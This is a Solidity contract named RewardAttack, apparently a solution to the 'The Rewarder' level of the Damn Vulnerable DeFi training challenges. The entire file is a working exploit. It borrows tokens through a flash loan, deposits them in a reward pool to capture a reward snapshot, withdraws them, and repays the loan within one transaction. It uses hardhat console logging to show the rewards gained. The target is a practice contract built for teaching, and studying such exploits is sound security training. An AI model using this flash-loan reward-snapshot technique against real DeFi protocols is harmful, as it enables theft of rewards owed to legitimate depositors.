pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "./AccountingToken.sol";

import "hardhat/console.sol";

contract RewardAttack {

	using Address for address;

	address owner;

	FlashLoanerPool flashLoanerPool;
	TheRewarderPool theRewarderPool;
	DamnValuableToken liquidityToken;
	RewardToken rewardToken;
	AccountingToken accountingToken;

	constructor(address damnValuableTokenAddress){
		
		owner = msg.sender;
		liquidityToken = DamnValuableToken(damnValuableTokenAddress);

	}

	function attack(address rewardPoolAddress, address flashPoolAddress, uint256 amount, address rewardTokenAddress, address accountingTokenAddress) external {

		flashLoanerPool = FlashLoanerPool(flashPoolAddress);
		theRewarderPool = TheRewarderPool(rewardPoolAddress);
		rewardToken = RewardToken(rewardTokenAddress);
		accountingToken = AccountingToken(accountingTokenAddress);

		flashLoanerPool.flashLoan(amount);
	}

	function receiveFlashLoan(uint256 amount) external{

		console.log("Flash loan received");

		uint256 a = liquidityToken.balanceOf(address(this));

		console.log("Money of flashloan", a / (10**18));
		//prepare for deposit
		liquidityToken.approve(address(theRewarderPool), amount);

		theRewarderPool.deposit(amount);
		
		theRewarderPool.withdraw(amount);

		uint256 b = rewardToken.balanceOf(address(this));
		console.log("Money of reward", b / (10**18));
		//Pay back the flash loan
		liquidityToken.transfer(address(flashLoanerPool), amount);
	}
}